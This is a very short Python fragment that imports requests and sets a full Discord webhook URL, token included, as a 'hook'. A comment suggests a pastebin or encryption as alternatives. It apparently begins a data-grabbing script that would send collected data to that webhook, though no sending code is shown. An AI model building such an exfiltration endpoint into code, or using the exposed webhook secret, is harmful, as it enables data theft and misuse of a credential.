import requests

hook = "https://discord.com/api/webhooks/1047216366412894259/9HAVMYyzrQUzVWZxHBBf6QFScZCs14fdPdlOl1amEcq-xQwvX5LL1u1wAN6Uo0GnPf2h" # or a pastebin, or u can add u own encrypt etccccccccccc
